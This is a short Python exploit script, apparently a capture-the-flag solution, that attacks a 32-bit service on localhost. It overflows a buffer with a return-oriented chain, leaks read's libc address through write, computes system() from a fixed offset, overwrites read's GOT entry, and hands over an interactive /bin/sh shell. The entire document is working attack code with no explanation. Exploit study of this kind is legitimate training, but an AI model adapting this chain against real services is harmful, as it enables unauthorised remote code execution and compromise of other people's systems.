from struct import *
from socket import *
from time import *
from telnetlib import *
up = lambda x: unpack("<L", x)
p = lambda x: pack("<L", x)
s = socket(AF_INET, SOCK_STREAM)
s.connect(("127.0.0.1", 61001))

read_plt = 0x804832c
read_got = 0x804961c
write_plt = 0x804830c
bss = 0x08049628
pppr = 0x80484b6
read_offset = 0x9abe0
write_got = 0x8049614
payload = ""
payload += "a"*140
payload += p(read_plt)
payload += p(pppr)
payload += p(1)
payload += p(bss)
payload += p(8)

payload += p(write_plt)
payload += p(pppr)
payload += p(0)
payload += p(read_got)
payload += p(4)

payload += p(read_plt)
payload += p(pppr)
payload += p(1)
payload += p(read_got)
payload += p(4)

payload += p(read_plt)
payload += "aaaa"
payload += p(bss)

s.send(payload+"\n")
sleep(1)
s.send("/bin/sh")
sleep(1)
read = up(s.recv(4))[0]

print "[*] read : %s" %str(hex(read))
system = read-read_offset

print "[*] system : %s" %str(hex(system))


s.send(p(system))

t = Telnet()
t.sock = s
t.interact()
